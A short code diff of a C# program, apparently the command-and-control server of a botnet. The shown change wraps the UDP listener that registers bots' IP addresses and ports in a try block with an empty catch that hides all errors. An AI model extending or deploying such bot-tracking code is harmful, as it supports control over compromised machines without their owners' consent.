@@ -36,18 +36,23 @@ namespace CNC
             {
                 IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
                 UInt16 botPort;
-                Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);
-                if (receiveBytes.Length == 2)
+                try
                 {
-                    botPort = BitConverter.ToUInt16(receiveBytes, 0);
-                    botInfo bi;
-                    bi.port = botPort;
-                    bi.IP = RemoteIpEndPoint.Address.ToString();
-                    m1.WaitOne();
-                    if (!(lst.Any(item => item.IP.Equals(bi.IP) && item.port == bi.port)))
-                        lst.Add(bi);
-                    m1.ReleaseMutex();
+                    Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);
+
+                    if (receiveBytes.Length == 2)
+                    {
+                        botPort = BitConverter.ToUInt16(receiveBytes, 0);
+                        botInfo bi;
+                        bi.port = botPort;
+                        bi.IP = RemoteIpEndPoint.Address.ToString();
+                        m1.WaitOne();
+                        if (!(lst.Any(item => item.IP.Equals(bi.IP) && item.port == bi.port)))
+                            lst.Add(bi);
+                        m1.ReleaseMutex();
+                    }
                 }
+                catch (Exception e) { }
             }
 
 
